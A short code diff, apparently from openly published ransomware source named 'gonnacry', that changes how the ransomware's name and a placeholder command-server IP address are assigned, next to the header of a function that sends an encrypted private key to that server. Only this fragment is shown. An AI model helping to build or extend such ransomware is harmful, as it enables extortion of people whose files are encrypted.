@@ -7,8 +7,8 @@ import base64
 from Crypto.PublicKey import RSA
 
 
-ransomware_name = tuple("gonnacry")
-server_address = tuple("123.123.123.123")
+ransomware_name = ("gonnacry")
+server_address = ("123.123.123.123")
 
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
